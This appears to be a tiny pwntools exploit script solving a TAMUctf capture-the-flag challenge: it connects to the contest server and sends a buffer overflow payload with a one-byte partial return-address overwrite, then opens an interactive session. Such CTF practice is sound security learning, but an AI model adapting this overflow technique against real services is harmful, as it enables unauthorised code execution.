from pwn import *

r = remote("pwn.tamuctf.com", 4322)

payload = "A" * 0x1e + "\xd8"

r.sendlineafter("call?", payload)
r.interactive()

r.close()
